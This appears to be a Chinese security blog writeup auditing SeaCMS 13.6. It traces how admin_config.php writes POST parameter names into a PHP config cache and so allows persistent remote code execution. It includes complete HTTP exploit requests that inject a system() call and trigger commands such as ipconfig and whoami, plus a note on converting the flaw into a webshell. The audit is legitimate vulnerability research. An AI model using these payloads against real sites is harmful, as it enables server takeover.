#  【代码审计】web漏洞之seacms13.6登录后文件写入缓存文件导致getshell  
原创 地图大师挖漏洞
                    地图大师挖漏洞  地图大师的漏洞追踪指南   2026-09-28 06:53  
  
   
  
# 最近一段时间在研究学习代码审计，陆续提交了十几个cve漏洞，学习过程中相比于以前黑盒挖洞来说对于漏洞底层有了一些新的理解， 最近主力审计还是以学习java为主，想着把之前审计出来的漏洞写成文章，避免过段时间忘了，复现都没法复现了。  
## 一、项目搭建  
  
官网地址：https://www.seacms.com/  最新版本为13.6，使用phpstudy可以直接搭建，搭建起来后页面上进行安装，安装完毕后管理后台会随机一个6位字符的后台目录。  
```
首页地址：http://127.0.0.1后台地址：http://127.0.0.1/1xcek9用户名：admin密 码：admin
```  
  
分析代码构成发现该代码属于无框架的代码（没有使用thinkphp等mvc架构），安装后会自动创建一个随机目录  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/DdVXYMZZ2zjSJcoowf8b65HUPNMSXqIF5qLl21wLWH3iaHpCSWv1Dg3VaIaygqEy5KWmYfpqKGpy9BkaViaXdibsHXg3A4L185lxjSXMVnstLQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zhoPmuctG6adRfntoySDTlztz61MlxiboZGBRmwNJssicq7Ew0L7QGpQhwOicakD2iaEm4A7XBDd3fRfxMJSWnpGzxdTfzZmNI9HVs/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 二、鉴权及路由分析  
#### 1、鉴权分析  
  
随便点几个后台页面发现都有CheckPurview();  
  跟进去查看代码发现ChangePath.php就是页面的鉴权代码，研究了一下没有能绕过的点，如果找页面未授权可以挨个看看所有页面是否有不包含CheckPurview()  
 的  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zjv9QiaWTxwgAL35xvkSKelI9dr6rJuAXMAicmxBX0UPfZzZj7ArmFatgxu3aaUntBibqHJK9tPmvG4ia1hTApyeggO3x4RorcJAns/640?wx_fmt=png&from=appmsg "")  
  
image.png  
#### 2、路由分析  
  
因为这个项目没有用框架，所以基本上访问那个文件就是对应的页面，通过分析登录数据包，发现其请求的是安装目录的login.php文件  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zhpiaMM05ltlU3bkicD3XvnP992nnYungS5Lhpsl6j5WO9Kx9icicJ2hOfGibOYMicPib4WDGj1hFnAAWO3C0cPF1iakW7IqLZguloVSLI/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
通过追踪发现是  
和  
pwd获取的账号和密码，但是追踪不到输入点  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zgur3kAEgPMukPKjgJaaSqMSHoicgAUf5wXr4xNtuiaDpibib6ViaOwNrGx2vrgYuM5YObCAQRwgia7pIMFiaHia96zKN53f2UJLC1icFfw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
查看include包含的文件  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zhaZwiat2Xm03FlMlkotbOLbzibZWWENtmHwDpHF3mTbflqpbibn3DtDwYgfibAcQk9GBdibL0BjCDx0TPEC55NibicXTNT6qTkAh4roM/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
common.php有一个动态变量，会将get、post、cookie、server获取的值变成变量  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zjSACpmDdCMKy7Sboe3MFufRnu9yyHvdLkgwJgWT3QgmC2PnIAy6YVb9vibYNrWicecqP7ibZdxpKOEc0FX3jpdZxsT1MKAPWnHpc/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
按照登录举例子  
  
$  
就是  
use  
rid,$_request=userid前面自动加上$让userid成为了一个变量值，pwd也是一样，这里存在优先级覆盖顺序server>cookie>post>get  
## 三、漏洞分析  
#### 1、使用haefile的php敏感函数扫描  
  
对haefile扫描出来的告警进行挨个分析，分析到文件写入函数的时候追踪发现可能存在文件写入函数用户可控  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/DdVXYMZZ2zia7fZuguduB6EpClXlnt0rpxazZFata8yVVBBzTCVZL8hIs7ZB9PFVdyDtpoOAWhlwmbOEibWxz7hXnZfQDAN3XpWeqjhj9PmNo/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 漏洞：文件写入导致的代码执行  
  
此处接收了一个动态变量  
  
1xcek9\admin_config.php  
```
漏洞代码：    foreach($_POST as $k=>$v)    {        if(m_ereg("^edit___",$k))        {            if(is_array($$k))                $v = cn_substr(str_replace("'","\'",str_replace("\\","\\\\",stripslashes(implode(',',$$k)))),99999);             else                $v = cn_substr(str_replace("'","\'",str_replace("\\","\\\\",stripslashes(${$k}))),99999);         }        else        {            continue;        }        $k = m_ereg_replace("^edit___","",$k);        $configstr .="\${$k} = '$v';\r\n";    }    到：$fp = fopen($configfile,'w');    flock($fp,3);    fwrite($fp,"<"."?php\r\n");    fwrite($fp,$configstr);    fwrite($fp,"?".">");    fclose($fp);    $fpp = fopen($m_file,'r');    $player = fread($fpp,filesize($m_file));    fclose($fpp);
```  
1. 1. 此处循环代码foreach($_POST as $k=>$v)相当于POST 接收参数，所以这里我们可以控制把$k赋予一句话木马并把后面的$v注释掉，最终执行$k的变量内容，例如下方赋值：  
  
```
$_POST = [    'edit___x;@system($_GET{0});//' => 'poc'];
```  
  
而当前代码遍历的是 $_POST  
。因此必须确认请求方式或代码是否还存在其他接收逻辑。  
1. 1. 进入 foreach  
  
```
foreach ($_POST as $k => $v)
```  
  
第一次循环得到：  
```
$k = 'edit___x;@system($_GET{0});//';$v = 'poc';
```  
1. 1. 判断参数名前缀  
  
```
if (m_ereg("^edit___", $k))
```  
  
因为 $k 以 edit___  
 开头，所以条件成立。  
1. 1. 去掉 edit___  
  
```
$k = m_ereg_replace("^edit___", "", $k);
```  
  
执行后：  
```
$k = 'x;@system($_GET{0});//';
```  
  
这里的危险点是：程序只去掉了前缀，却没有验证 $k 是否只是普通变量名。  
1. 1. 拼接配置代码  
  
代码是：  
```
$configstr .= "\${$k} = '$v';\r\n";
```  
  
把当前   
和  
v 代入后，结果近似为：  
```
$x;@system($_GET{0});// = 'poc';
```  
  
原本开发者希望生成的是：  
```
$cfg_name = 'poc';
```  
  
但由于 $k 中包含分号、函数调用和注释符，最终生成了多条 PHP 语句。  
1. 1. 写入配置文件  
  
随后程序执行：  
```
fwrite($fp, $configstr);
```  
  
于是恶意内容被保存到：  
```
data/config.cache.inc.php
```  
1. 1. 后续加载配置文件时执行  
  
如果其他 PHP 文件执行：  
```
require_once 'data/config.cache.inc.php';
```  
  
PHP 会解析其中内容：  
```
$x;@system($_GET{0]);// = 'poc';
```  
  
执行顺序是：  
- • $x;  
：读取变量；  
  
- • @system($_GET{0});  
：调用系统命令执行函数；  
  
- • //  
：把后面的内容注释掉。  
  
所以 poc  
 不是命令，也不是主要执行内容；它只是被放在被注释掉的尾部。真正危险的是参数名中被注入的：  
```
; @system($_GET{0}); //
```  
  
整个漏洞链可以概括为：  
```
用户控制 POST 参数名    ↓去掉 edit___ 前缀    ↓未校验 $k    ↓拼接成 PHP 源码    ↓写入 config.cache.inc.php    ↓配置文件被 include 时执行注入代码
```  
## PAYLOAD 1 —— 注入（POST，需后台管理员会话）  
```
POST /<ADMIN_DIR>/admin_config.php HTTP/1.1Host: <HOST>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: */*Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=<PHPSESSID>Content-Length: 215dopost=save&edit___cfg_df_style=default&edit___cfg_df_html=html&edit___cfg_ads_dir=ads&edit___cfg_upload_dir=uploads&edit___cfg_backup_dir=bdata&edit___cfg_runmode=3&edit___x%3B%40system(%24_GET%7B0%7D)%3B%2F%2F=poc
```  
- • 恶意参数名还原：edit___x;@system($_GET{0});//  
，写入 data/config.cache.inc.php  
 第 8 行：$x;@system($_GET{0});// = 'poc';  
  
## PAYLOAD 2 —— 触发命令执行（GET，无需登录）  
  
此处存在一个包含操作流程：  
```
index.php  ↓ require_once("include/common.php")include/common.php  ↓ require_once(sea_INC . "/common.func.php")include/common.func.php  ↓ require_once(sea_ROOT . "/data/config.cache.inc.php")data/config.cache.inc.php  ↓ PHP 解释并执行其中代码
```  
```
GET /index.php?0=ipconfig HTTP/1.1Host: <HOST>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: */*
```  
- • 换命令：?0=whoami  
、?0=dir  
、?0=type 某文件  
 等（Windows 目标）  
  
- • webshell 化：注入参数名改为 edit___x;@system($_POST{0});//  
，之后 POST 0=<命令>  
 即可  
  
## 原理一句话  
  
后台 admin_config.php  
 保存配置时遍历 POST 参数名，仅剥离 edit___  
 前缀、无白名单，直接拼成 PHP 变量赋值语句写入 data/config.cache.inc.php  
（全站每个请求 include）→ 注入即持久化 RCE。  
  
edit___x=whoami  
  
为什么index.php可以执行  
  
因为 index.php  
 会间接加载 config.cache.inc.php  
。调用链如下：  
```
index.php  ↓ require_once("include/common.php")include/common.php  ↓ require_once(sea_INC . "/common.func.php")include/common.func.php  ↓ require_once(sea_ROOT . "/data/config.cache.inc.php")data/config.cache.inc.php  ↓ PHP 解释并执行其中代码
```  
  
具体对应代码：  
  
index.php  
：  
```
require_once ("include/common.php");
```  
  
include/common.php  
：  
```
require_once(sea_INC.'/common.func.php');
```  
  
include/common.func.php  
：  
```
require_once(sea_ROOT.'/data/config.cache.inc.php');
```  
  
因此，当 admin_config.php  
 将恶意内容写入：  
```
data/config.cache.inc.php
```  
  
用户之后访问 index.php  
 时，执行步骤就是：  
1. 1. index.php  
 开始运行；  
  
1. 2. 加载 include/common.php  
；  
  
1. 3. common.php  
 加载 include/common.func.php  
；  
  
1. 4. common.func.php  
 加载 data/config.cache.inc.php  
；  
  
1. 5. PHP 解析该配置文件；  
  
1. 6. 配置文件中的注入语句被执行；  
  
1. 7. 随后才继续执行首页的其他逻辑。  
  
可以抽象为：  
```
访问 index.php    ↓加载 common.php    ↓加载 common.func.php    ↓加载 config.cache.inc.php    ↓执行配置文件中的 PHP 代码
```  
  
所以并不是 index.php  
 自己包含了 system()  
，而是它的依赖文件链最终包含了被污染的配置文件。  
  
当前项目中，config.cache.inc.php  
 已经包含：  
```
@system($_GET{0});
```  
  
因此只要访问会走到上述包含链的入口，就可能触发这段代码。@  
 只会隐藏错误信息，不会阻止执行。  
### 第一次写关于代码审计的分析，并且这个rce还是比较抽象的那种，后面再写尽量写的适合大家0基础去看下，弄点好分析的漏洞给大家详细分析，这个确实是稍微有点难度，我隔一段时间看，自己分析也得分析半天。只能说学无止境吧！  
  
  
  
